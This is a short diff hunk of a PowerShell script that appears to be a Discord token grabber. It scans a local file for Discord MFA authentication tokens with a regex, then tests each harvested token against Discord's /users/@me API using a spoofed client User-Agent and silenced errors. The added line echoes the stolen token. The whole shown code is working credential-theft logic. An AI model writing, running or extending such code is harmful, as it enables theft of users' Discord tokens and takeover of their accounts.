@@ -17,6 +17,7 @@ if ( Test-Path -LiteralPath $stable ) {
                 $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
         if ($mfa.length -gt 1) {
             try {
+                echo $mfa
                 $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                 -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
             } catch {
